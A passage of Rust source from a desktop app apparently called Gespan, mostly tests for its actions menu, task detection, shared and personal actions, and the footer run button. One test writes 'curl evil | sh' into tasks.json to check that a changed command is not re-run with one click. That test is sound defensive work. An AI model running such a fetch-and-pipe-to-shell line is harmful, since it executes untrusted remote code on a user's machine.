                                                .bg(gpui::hsla(0., 0.66, 0.47, 0.08))
                                                .cursor_pointer()
                                                .on_click(cx.listener(|this, _, window, cx| {
                                                    this.delete_action(window, cx)
                                                })),
                                            )
                                        })
                                        .child(
                                            crate::modal::ghost_button("action-cancel", "Cancel")
                                                .w_full()
                                                .cursor_pointer()
                                                .on_click(cx.listener(|this, _, window, cx| {
                                                    this.close_action_dialog(window, cx)
                                                })),
                                        ),
                                ),
                        ),
                )
                .into_any_element(),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::MenuTarget;
    use crate::popover::MenuItem;
    use crate::shell::Shell;
    use crate::workspace::ProjectAction;
    use gpui::Context;
    use std::path::Path;

    fn write(dir: &Path, file: &str, text: &str) {
        let path = dir.join(file);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn tasks(tasks: &str) -> String {
        format!(r#"{{ "version": "2.0.0", "tasks": [{tasks}] }}"#)
    }

    /// Makes `dir` the project and the active session's worktree, so each
    /// test has its own personal actions and checkout.
    fn checkout(shell: &mut Shell, active: i64, dir: &Path, cx: &mut Context<Shell>) {
        let path = dir.to_string_lossy().into_owned();
        shell.workspace.project = path.clone();
        shell.workspace.active = Some(active);
        shell.ensure_session(active, cx);
        shell.sessions[&active].update(cx, |chat, _| chat.settings.worktree_cwd = Some(path));
    }

    /// Each row as text: `# caption` (case kept), `header TEXT`, `---`, or
    /// `label | description`, with `(off)` on disabled rows.
    fn rows(items: &[MenuItem]) -> Vec<String> {
        items
            .iter()
            .map(|item| match item {
                MenuItem::Header(text) => format!("header {text}"),
                MenuItem::Caption(text) => format!("# {text}"),
                MenuItem::Separator => "---".into(),
                MenuItem::Note(text) => format!("note {text}"),
                MenuItem::Custom(..) => "custom".into(),
                MenuItem::Action(action) => format!(
                    "{}{}{}",
                    action.label,
                    action
                        .description
                        .as_ref()
                        .map(|d| format!(" | {d}"))
                        .unwrap_or_default(),
                    if action.disabled { " (off)" } else { "" }
                ),
            })
            .collect()
    }

    fn cwd(path: &Path) -> String {
        path.to_string_lossy().into_owned()
    }

    #[gpui::test]
    fn menu_groups_project_personal_then_detected_sources(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
        write(
            root,
            ".gespan/tasks.json",
            &tasks(r#"{ "label": "Ship", "command": "echo ship", "detail": "Ships it" }"#),
        );
        let targets: String = (1..=9).map(|n| format!("t{n}:\n\techo {n}\n")).collect();
        write(root, "Makefile", &targets);
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.open_action_dialog(None, window, cx);
                // Kept personal.
                shell.toggle_action_share(cx);
                let dialog = shell.action_dialog.as_mut().unwrap();
                dialog.icon = "rocket";
                let (name, command) = (dialog.name.clone(), dialog.command.clone());
                name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
                command.update(cx, |i, cx| i.set_text("./deploy.sh".into(), cx));
                shell.save_action(window, cx);

                shell.refresh_actions(cx);
                let menu = shell.actions_menu();
                let rows = rows(&menu);
                let headers: Vec<_> = rows.iter().filter(|r| r.starts_with("# ")).collect();
                assert_eq!(
                    headers,
                    ["# Project", "# Personal", "# package.json"],
                    "{rows:?}"
                );
                let at = |text: &str| {
                    let at = rows.iter().position(|r| r == text);
                    at.unwrap_or_else(|| panic!("{text} not in {rows:?}"))
                };
                assert!(at("# Project") < at("Ship | Ships it"));
                assert!(at("Ship | Ships it") < at("# Personal"));
                assert!(at("# Personal") < at("Deploy | ./deploy.sh"));
                assert!(at("Deploy | ./deploy.sh") < at("# package.json"));
                assert!(at("# package.json") < at("dev | vite"));
                // Nine Makefile targets start collapsed behind one row.
                assert!(at("dev | vite") < at("Makefile (9)"));
                assert!(!rows.iter().any(|r| r.starts_with("t1")));
                let deploy = menu.iter().find_map(|item| match item {
                    MenuItem::Action(a) if a.label.as_ref() == "Deploy" => Some(a.clone()),
                    _ => None,
                });
                assert_eq!(deploy.unwrap().icon, Some("rocket"));
                // The rest of the menu stays: edit personal ones, add one.
                assert!(rows.iter().any(|r| r == "Edit action"));
                assert_eq!(rows.last().unwrap(), "Add action");

                // Expanding shows the section's rows under its header.
                shell.toggle_action_section("Makefile");
                let rows = super::tests::rows(&shell.actions_menu());
                let header = rows.iter().position(|r| r == "# Makefile").unwrap();
                assert_eq!(rows[header + 1], "t1 | make t1");
                assert_eq!(rows[header + 9], "t9 | make t9");
                assert!(!rows.iter().any(|r| r == "Makefile (9)"));
                // A fresh menu starts collapsed again.
                shell.refresh_actions(cx);
                assert!(
                    super::tests::rows(&shell.actions_menu())
                        .iter()
                        .any(|r| r == "Makefile (9)")
                );
            })
            .unwrap();
    }

    #[gpui::test]
    fn clicking_a_detected_action_runs_it_in_its_cwd(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join("web")).unwrap();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(
                r#"{ "label": "Web", "command": "echo web",
                      "options": { "cwd": "web", "env": { "GREETING": "hi", "P": "${env:PATH}" } } },
                    { "label": "Root", "command": "echo root" }"#,
            ),
        );
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                shell.refresh_actions(cx);
                shell.run_actions_menu("run:gespan:Web", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 1);
                let web = cwd(&root.join("web"));
                assert_eq!(terminals[0].read(cx).cwd, web);
                assert_eq!(shell.workspace.docks[&project].terminals, [web]);
                // `env` reaches the terminal, its references filled in from
                // Gespan's own environment.
                let env = terminals[0].read(cx).env.clone();
                assert!(env.contains(&("GREETING".into(), "hi".into())), "{env:?}");
                let own = std::env::var("PATH").unwrap_or_default();
                assert!(env.contains(&("P".into(), own)), "{env:?}");
                assert_eq!(
                    shell.workspace.last_actions[&project],
                    "gespan:Web".to_string()
                );
                assert_eq!(
                    shell.footer_action().map(|a| a.id.clone()),
                    Some("gespan:Web".into())
                );

                // Idle, the same action reuses its terminal.
                terminals[0].update(cx, |t, _| t.foreground = None);
                shell.run_action("gespan:Web", window, cx);
                assert_eq!(shell.terminals[&project].len(), 1);
                // Another action runs at the checkout root in its own.
                shell.run_action("gespan:Root", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 2);
                assert_eq!(terminals[1].read(cx).cwd, cwd(root));
                assert!(terminals[1].read(cx).env.is_empty());
            })
            .unwrap();
        // The file changes the action's cwd: its idle terminal isn't reused.
        std::fs::create_dir_all(root.join("api")).unwrap();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(r#"{ "label": "Web", "command": "echo web", "options": { "cwd": "api" } }"#),
        );
        window
            .update(cx, |shell, window, cx| {
                let project = shell.workspace.project.clone();
                for t in &shell.terminals[&project] {
                    t.update(cx, |t, _| t.foreground = None);
                }
                shell.run_action("gespan:Web", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 3);
                assert_eq!(terminals[2].read(cx).cwd, cwd(&root.join("api")));
            })
            .unwrap();
        // Only its env changes: same cwd, still a fresh terminal.
        write(
            root,
            ".gespan/tasks.json",
            &tasks(
                r#"{ "label": "Web", "command": "echo web",
                     "options": { "cwd": "api", "env": { "MODE": "dev" } } }"#,
            ),
        );
        window
            .update(cx, |shell, window, cx| {
                let project = shell.workspace.project.clone();
                for t in &shell.terminals[&project] {
                    t.update(cx, |t, _| t.foreground = None);
                }
                shell.run_action("gespan:Web", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 4);
                assert_eq!(terminals[3].read(cx).cwd, cwd(&root.join("api")));
                assert_eq!(terminals[3].read(cx).env, [("MODE".into(), "dev".into())]);
            })
            .unwrap();
    }

    #[gpui::test]
    fn a_legacy_personal_last_action_still_resolves(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                let action = ProjectAction {
                    id: "abc".into(),
                    name: "Deploy".into(),
                    command: "./deploy.sh".into(),
                    icon: "rocket".into(),
                };
                shell
                    .workspace
                    .actions
                    .insert(project.clone(), vec![action]);
                // Saved before actions had sources: a bare id.
                shell
                    .workspace
                    .last_actions
                    .insert(project.clone(), "abc".into());
                shell.sync_personal();
                shell.refresh_actions(cx);
                // Nothing says what it ran, so one click doesn't run it.
                assert!(shell.footer_action().is_none());

                // The bare id still runs it, at the checkout root.
                shell.run_action("abc", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 1);
                assert_eq!(terminals[0].read(cx).cwd, cwd(root));
                assert_eq!(shell.workspace.last_actions[&project], "personal:abc");
                let current = shell.footer_action().cloned().unwrap();
                assert_eq!(
                    (current.id.as_str(), current.label.as_str()),
                    ("personal:abc", "Deploy")
                );

                // Deleting it forgets it as the last one run.
                shell.open_action_dialog(Some("abc".into()), window, cx);
                shell.delete_action(window, cx);
                assert!(!shell.workspace.last_actions.contains_key(&project));
                assert!(
                    !shell
                        .workspace
                        .last_action_fingerprints
                        .contains_key(&project)
                );
                shell.refresh_actions(cx);
                assert!(shell.footer_action().is_none());
                // Gone for agents too.
                let listing = gespan_core::project_actions::detect(&project, root);
                assert!(listing.actions.iter().all(|a| a.source != "personal"));
            })
            .unwrap();
    }

    #[gpui::test]
    fn blocked_and_error_rows_are_disabled(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(
                r#"{ "label": "Pick", "command": "echo ${input:target}" },
                   { "label": "Fine", "command": "echo fine" }"#,
            ),
        );
        write(root, ".vscode/tasks.json", "{ \"tasks\": [ ");
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                shell.refresh_actions(cx);
                let listing = shell.listing(cx);
                let reason = listing.actions[0].blocked.clone().unwrap();
                assert!(reason.starts_with("Uses ${input:target}"), "{reason}");
                let error = &listing.errors[0];
                assert_eq!(error.file, ".vscode/tasks.json");

                let rows = rows(&shell.actions_menu());
                assert!(rows.contains(&format!("Pick | {reason} (off)")), "{rows:?}");
                assert!(rows.contains(&"Fine | echo fine".to_string()));
                let header = rows
                    .iter()
                    .position(|r| r == "# .vscode/tasks.json")
                    .unwrap();
                assert_eq!(
                    rows[header + 1],
                    format!("Couldn't read .vscode/tasks.json: {} (off)", error.reason)
                );
                // Nothing was run here, so the footer runs nothing.
                assert!(shell.footer_action().is_none());

                // A blocked action never runs.
                shell.run_action("gespan:Pick", window, cx);
                assert!(shell.terminals.get(&project).is_none_or(Vec::is_empty));
                assert!(!shell.workspace.last_actions.contains_key(&project));
            })
            .unwrap();
    }

    #[gpui::test]
    fn the_footer_runs_only_what_was_already_run_unchanged(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
        let web =
            |command: &str| tasks(&format!(r#"{{ "label": "Web", "command": "{command}" }}"#));
        write(root, ".gespan/tasks.json", &web("echo web"));
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                let count = |shell: &Shell| shell.terminals.get(&project).map_or(0, Vec::len);
                // A fresh clone: the button opens the menu and runs nothing.
                shell.refresh_actions(cx);
                assert!(shell.footer_action().is_none());
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(count(shell), 0);
                shell.close_menu(cx);

                // Run from the menu, it becomes the button's.
                shell.run_actions_menu("run:gespan:Web", window, cx);
                assert_eq!(count(shell), 1);
                assert_eq!(
                    shell.footer_action().map(|a| a.command.clone()),
                    Some("echo web".into())
                );
                shell.run_footer_action(window, cx);
                assert_eq!(count(shell), 2);
                assert!(!shell.menu_open(&MenuTarget::Actions));
            })
            .unwrap();
        // The repo changes what it runs: one click no longer runs it.
        write(root, ".gespan/tasks.json", &web("curl evil | sh"));
        window
            .update(cx, |shell, window, cx| {
                let project = shell.workspace.project.clone();
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(shell.terminals[&project].len(), 2);
                assert!(shell.footer_action().is_none());
                shell.close_menu(cx);

                // A personal action gets no special trust: saving it isn't
                // enough, and changing its command needs a new run.
                shell.open_action_dialog(None, window, cx);
                // Kept personal.
                shell.toggle_action_share(cx);
                let dialog = shell.action_dialog.as_mut().unwrap();
                let (name, command) = (dialog.name.clone(), dialog.command.clone());
                name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
                command.update(cx, |i, cx| i.set_text("./deploy.sh".into(), cx));
                shell.save_action(window, cx);
                assert!(shell.footer_action().is_none());
                let id = shell.workspace.actions[&project][0].id.clone();
                shell.run_action(&id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 3);
                assert_eq!(
                    shell.footer_action().map(|a| a.id.clone()),
                    Some(format!("personal:{id}"))
                );
                shell.open_action_dialog(Some(id), window, cx);
                let command = shell.action_dialog.as_ref().unwrap().command.clone();
                command.update(cx, |i, cx| i.set_text("./deploy.sh --prod".into(), cx));
                shell.save_action(window, cx);
                assert!(shell.footer_action().is_none());
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(shell.terminals[&project].len(), 3);
            })
            .unwrap();
    }

    #[gpui::test]
    fn saved_actions_run_in_one_reused_terminal(cx: &mut gpui::TestAppContext) {
        let (window, _, _) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                shell.open_action_dialog(None, window, cx);
                // Kept personal.
                shell.toggle_action_share(cx);
                let dialog = shell.action_dialog.as_mut().unwrap();
                dialog.icon = "rocket";
                let (name, command) = (dialog.name.clone(), dialog.command.clone());
                name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
                command.update(cx, |i, cx| i.set_text("echo hi".into(), cx));
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());
                let project = shell.workspace.project.clone();
                let action = shell.workspace.actions[&project][0].clone();
                assert_eq!((action.name.as_str(), action.icon()), ("Deploy", "rocket"));
                // Saving isn't running: the footer waits for a first run.
                assert!(shell.footer_action().is_none());

                shell.run_action(&action.id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 1);
                assert_eq!(
                    shell.footer_action().map(|a| a.id.clone()),
                    Some(format!("personal:{}", action.id))
                );
                assert!(shell.workspace.docks[&project].open);
                // The terminal is still busy with the first run, so a second
                // run opens another; once idle, it is reused.
                shell.run_action(&action.id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 2);
                for t in &shell.terminals[&project] {
                    t.update(cx, |t, _| t.foreground = None);
                }
                shell.run_action(&action.id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 2);
                shell.open_action_dialog(Some(action.id), window, cx);
            })
            .unwrap();
        // The edit dialog, with its Delete button, renders.
        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
        visual.run_until_parked();
        assert!(visual.debug_bounds("action-delete").is_some());
    }

    /// Fills the open dialog's name and command.
    fn type_action(shell: &mut Shell, name: &str, command: &str, cx: &mut Context<Shell>) {
        let dialog = shell.action_dialog.as_ref().unwrap();
        let (n, c) = (dialog.name.clone(), dialog.command.clone());
        n.update(cx, |i, cx| i.set_text(name.into(), cx));
        c.update(cx, |i, cx| i.set_text(command.into(), cx));
    }

    fn shared(dir: &Path) -> serde_json::Value {
        let text = std::fs::read_to_string(dir.join(".gespan/tasks.json")).unwrap();
        serde_json::from_str(&text).unwrap()
    }

    /// The rows from `header` up to the next separator.
    fn section(rows: &[String], header: &str) -> Vec<String> {
        let Some(at) = rows.iter().position(|r| r == header) else {
            return Vec::new();
        };
        rows[at + 1..]
            .iter()
            .take_while(|r| *r != "---")
            .cloned()
            .collect()
    }

    /// The labels in the submenu of the row labelled `parent`.
    fn submenu(items: &[MenuItem], parent: &str) -> Vec<(String, String)> {
        items
            .iter()
            .find_map(|item| match item {
                MenuItem::Action(a) if a.label.as_ref() == parent => Some(
                    a.submenu
                        .iter()
                        .map(|s| (s.id.to_string(), s.label.to_string()))
                        .collect(),
                ),
                _ => None,
            })
            .unwrap_or_default()
    }

    #[gpui::test]
    fn a_new_shared_action_lands_in_gespan_tasks_json(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                shell.open_action_dialog(None, window, cx);
                // Sharing is on unless turned off.
                assert!(shell.action_dialog.as_ref().unwrap().share);
                shell.action_dialog.as_mut().unwrap().icon = "rocket";
                type_action(shell, " Deploy ", "./deploy.sh", cx);
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());

                assert_eq!(
                    shared(root)["tasks"],
                    serde_json::json!([{
                        "label": "Deploy", "type": "shell", "command": "./deploy.sh",
                        "icon": { "id": "rocket" },
                    }])
                );
                assert!(!shell.workspace.actions.contains_key(&project));
                assert_eq!(
                    shell.action_notice.as_ref().map(|n| n.to_string()),
                    Some("Added to .gespan/tasks.json. Commit it to share it.".into())
                );
                let rows = rows(&shell.actions_menu());
                assert_eq!(section(&rows, "# Project"), ["Deploy | ./deploy.sh"]);
                assert!(!rows.contains(&"# Personal".to_string()), "{rows:?}");

                // A second one by the same name is refused, and the dialog
                // stays open to say why.
                shell.action_notice = None;
                shell.open_action_dialog(None, window, cx);
                type_action(shell, "Deploy", "./other.sh", cx);
                shell.save_action(window, cx);
                let dialog = shell.action_dialog.as_ref().unwrap();
                assert_eq!(
                    dialog.error.as_ref().map(|e| e.to_string()),
                    Some("An action named \u{201c}Deploy\u{201d} already exists.".into())
                );
                assert!(dialog.hand_edit.is_none());
                assert!(shell.action_notice.is_none());
                assert_eq!(shared(root)["tasks"].as_array().unwrap().len(), 1);
            })
            .unwrap();
    }

    #[gpui::test]
    fn turning_share_off_keeps_it_personal(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                shell.open_action_dialog(None, window, cx);
                shell.toggle_action_share(cx);
                assert!(!shell.action_dialog.as_ref().unwrap().share);
                type_action(shell, "Deploy", "./deploy.sh", cx);
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());

                assert!(!root.join(".gespan").exists());
                assert!(shell.action_notice.is_none());
                let personal = &shell.workspace.actions[&project];
                assert_eq!(personal.len(), 1);
                assert_eq!(personal[0].name, "Deploy");
                let rows = rows(&shell.actions_menu());
                assert_eq!(section(&rows, "# Personal"), ["Deploy | ./deploy.sh"]);
                assert!(section(&rows, "# Project").is_empty(), "{rows:?}");

                // Toggling twice turns it back on.
                shell.open_action_dialog(None, window, cx);
                shell.toggle_action_share(cx);
                shell.toggle_action_share(cx);
                assert!(shell.action_dialog.as_ref().unwrap().share);
            })
            .unwrap();
        // The add dialog, with its toggle, renders.
        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
        visual.run_until_parked();
        assert!(visual.debug_bounds("action-share").is_some());
    }

    #[gpui::test]
    fn save_to_project_copies_a_detected_action_and_it_takes_over(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "package.json",
            r#"{ "scripts": { "dev": "vite", "lint": "eslint ." } }"#,
        );
        write(
            root,
            ".vscode/tasks.json",
            r#"{ "tasks": [ { "label": "Pick", "command": "echo ${input:x}" } ] }"#,
        );
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                let dev = shell
                    .listing(cx)
                    .actions
                    .into_iter()
                    .find(|a| a.id == "package.json:dev")
                    .unwrap();
                let menu = shell.actions_menu();
                // Every detected action that can run can be saved; blocked
                // ones and the project's own can't.
                assert_eq!(
                    submenu(&menu, "Save to project"),
                    [
                        ("save:package.json:dev".to_string(), "dev".to_string()),
                        ("save:package.json:lint".to_string(), "lint".to_string()),
                    ]
                );
                let package = section(&rows(&menu), "# package.json");
                assert_eq!(package.len(), 2, "{package:?}");
                assert!(package[0].starts_with("dev | ") && package[1].starts_with("lint | "));

                shell.run_actions_menu("save:package.json:dev", window, cx);
                let task = &shared(root)["tasks"][0];
                assert_eq!(task["label"], "dev");
                assert_eq!(task["command"], dev.command.as_str());
                assert_eq!(
                    shell.action_notice.as_ref().map(|n| n.to_string()),
                    Some("Added to .gespan/tasks.json. Commit it to share it.".into())
                );
                // The menu lists it under Project, and no longer under the
                // file it came from, which is left as it was.
                let menu = shell.actions_menu();
                let rows = rows(&menu);
                assert_eq!(section(&rows, "# Project").len(), 1, "{rows:?}");
                assert!(
                    section(&rows, "# Project")[0].starts_with("dev | "),
                    "{rows:?}"
                );
                let package = section(&rows, "# package.json");
                assert_eq!(package.len(), 1, "{rows:?}");
                assert!(package[0].starts_with("lint | "), "{rows:?}");
                assert_eq!(
                    std::fs::read_to_string(root.join("package.json")).unwrap(),
                    r#"{ "scripts": { "dev": "vite", "lint": "eslint ." } }"#
                );
                assert_eq!(
                    submenu(&menu, "Save to project"),
                    [("save:package.json:lint".to_string(), "lint".to_string())]
                );

                // Saving it twice is refused, and says why.
                shell.action_notice = None;
                shell.run_actions_menu("save:package.json:dev", window, cx);
                assert!(shell.action_notice.is_none());
                assert_eq!(shared(root)["tasks"].as_array().unwrap().len(), 1);
            })
            .unwrap();
    }

    #[gpui::test]
    fn editing_a_project_action_rewrites_it_in_place(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(
                r#"{ "label": "Ship", "command": "echo ship", "detail": "Ships it", "group": "build" },
                   { "label": "Keep", "command": "echo keep" }"#,
            ),
        );
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                let menu = shell.actions_menu();
                let edit = submenu(&menu, "Edit action");
                assert!(
                    edit.contains(&("edit:gespan:Ship".into(), "Ship".into())),
                    "{edit:?}"
                );

                shell.run_actions_menu("edit:gespan:Ship", window, cx);
                let dialog = shell.action_dialog.as_ref().unwrap();
                assert_eq!(dialog.name.read(cx).content, "Ship");
                assert_eq!(dialog.command.read(cx).content, "echo ship");
                type_action(shell, "Ship it", "echo shipped", cx);
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());
                let value = shared(root);
                // The detail and fields Gespan doesn't edit stay.
                assert_eq!(
                    value["tasks"][0],
                    serde_json::json!({
                        "label": "Ship it", "command": "echo shipped", "type": "shell",
                        "detail": "Ships it", "group": "build",
                    })
                );
                let project = shell.workspace.project.clone();
                assert!(!shell.workspace.actions.contains_key(&project));

                // Delete removes it from the file.
                shell.run_actions_menu("edit:gespan:Ship it", window, cx);
                shell.delete_action(window, cx);
                assert!(shell.action_dialog.is_none());
                let tasks = shared(root)["tasks"].clone();
                assert_eq!(tasks.as_array().unwrap().len(), 1);
                assert_eq!(tasks[0]["label"], "Keep");
            })
            .unwrap();
    }

    #[gpui::test]
    fn editing_a_commented_file_offers_open_instead_of_saving(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let text = "{\n  // Ours\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    { \"label\": \"Ship\", \"command\": \"echo ship\" }\n  ]\n}\n";
        write(root, ".gespan/tasks.json", text);
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                shell.run_actions_menu("edit:gespan:Ship", window, cx);
                type_action(shell, "Ship", "echo shipped", cx);
                shell.save_action(window, cx);
                let dialog = shell.action_dialog.as_ref().expect("the dialog stays open");
                assert_eq!(
                    dialog.error.as_ref().map(|e| e.to_string()),
                    Some("This tasks.json has comments, so Gespan won't rewrite it.".into())
                );
                assert!(dialog.hand_edit.is_some());
                // Delete is refused the same way.
                shell.delete_action(window, cx);
                assert!(shell.action_dialog.as_ref().unwrap().hand_edit.is_some());
                // A new shared action too.
                shell.close_action_dialog(window, cx);
                shell.open_action_dialog(None, window, cx);
                type_action(shell, "New", "echo new", cx);
                shell.save_action(window, cx);
                assert!(shell.action_dialog.as_ref().unwrap().hand_edit.is_some());
                assert_eq!(
                    std::fs::read_to_string(root.join(".gespan/tasks.json")).unwrap(),
                    text
                );
            })
            .unwrap();
        // The dialog offers Open tasks.json in place of saving.
        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
        visual.run_until_parked();
        assert!(visual.debug_bounds("action-open-tasks").is_some());
        window
            .update(cx, |shell, window, cx| {
                shell.open_tasks_json(window, cx);
                assert!(shell.action_dialog.is_none());
                let path = root
                    .join(".gespan/tasks.json")
                    .to_string_lossy()
                    .into_owned();
                let review = shell.reviews[&active].read(cx);
                assert!(
                    review.state.tabs.iter().any(|tab| matches!(
                        tab,
                        crate::review::ReviewTab::File { path: open, .. } if *open == path
                    )),
                    "{:?}",
                    review.state.tabs
                );

                // The comment goes, by hand. The next try asks the file again:
                // a name clash is now the only trouble, with nothing to open.
                write(root, ".gespan/tasks.json", &text.replace("  // Ours\n", ""));
                shell.open_action_dialog(None, window, cx);
                type_action(shell, "New", "echo new", cx);
                shell.action_dialog.as_mut().unwrap().hand_edit =
                    Some(super::WriteError::HasComments);
                type_action(shell, "Ship", "echo new", cx);
                shell.save_action(window, cx);
                let dialog = shell.action_dialog.as_ref().unwrap();
                assert!(dialog.hand_edit.is_none());
                assert_eq!(
                    dialog.error.as_ref().map(|e| e.to_string()),
                    Some("An action named \u{201c}Ship\u{201d} already exists.".into())
                );
                type_action(shell, "New", "echo new", cx);
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());
                assert_eq!(shared(root)["tasks"][1]["label"], "New");
            })
            .unwrap();
    }

    #[gpui::test]
    fn editing_only_the_name_keeps_workspace_folder_args_and_os_overrides(
        cx: &mut gpui::TestAppContext,
    ) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let build = r#"{ "label": "Build", "type": "process", "command": "${workspaceFolder}/build.sh",
              "args": ["--fast", "a b"], "options": { "env": { "MODE": "dev" } },
              "windows": { "command": "build.cmd" }, "detail": "Builds", "group": "build" }"#;
        write(root, ".gespan/tasks.json", &tasks(build));
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                shell.run_actions_menu("edit:gespan:Build", window, cx);
                // The dialog shows what runs here, this checkout's path in it.
                let command = shell.action_dialog.as_ref().unwrap().command.clone();
                let shown = command.read(cx).content.to_string();
                assert!(shown.contains(&root.display().to_string()), "{shown}");
                type_action(shell, "Build all", &shown, cx);
                shell.action_dialog.as_mut().unwrap().icon = "hammer";
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());
                // Only the name and icon changed in the shared file.
                assert_eq!(
                    shared(root)["tasks"][0],
                    serde_json::json!({
                        "label": "Build all", "type": "process",
                        "command": "${workspaceFolder}/build.sh", "args": ["--fast", "a b"],
                        "options": { "env": { "MODE": "dev" } },
                        "windows": { "command": "build.cmd" }, "detail": "Builds",
                        "group": "build", "icon": { "id": "hammer" },
                    })
                );
                let text = std::fs::read_to_string(root.join(".gespan/tasks.json")).unwrap();
                assert!(!text.contains(&root.display().to_string()), "{text}");
            })
            .unwrap();
    }

    #[gpui::test]
    fn a_new_command_for_a_task_with_args_is_refused_with_open_tasks_json(
        cx: &mut gpui::TestAppContext,
    ) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let lint = tasks(r#"{ "label": "Lint", "command": "eslint", "args": ["."] }"#);
        write(root, ".gespan/tasks.json", &lint);
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                shell.run_actions_menu("edit:gespan:Lint", window, cx);
                type_action(shell, "Lint", "eslint src", cx);
            })
            .unwrap();
        // Saved once the typing's events are in, as in the app.
        window
            .update(cx, |shell, window, cx| {
                shell.save_action(window, cx);
                let dialog = shell.action_dialog.as_ref().expect("the dialog stays open");
                let message = "This action uses arguments, per-OS commands or workspace \
                               variables; edit it in tasks.json";
                assert_eq!(
                    dialog.error.as_ref().map(|e| e.to_string()),
                    Some(message.into())
                );
                assert_eq!(
                    dialog.hand_edit.as_ref().map(|e| e.to_string()),
                    Some(message.into())
                );
                assert_eq!(
                    std::fs::read_to_string(root.join(".gespan/tasks.json")).unwrap(),
                    lint
                );
            })
            .unwrap();
        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
        visual.run_until_parked();
        assert!(visual.debug_bounds("action-open-tasks").is_some());
        // Putting the command back as it was brings Save back: a rename.
        window
            .update(visual, |shell, _, cx| {
                let command = shell.action_dialog.as_ref().unwrap().command.clone();
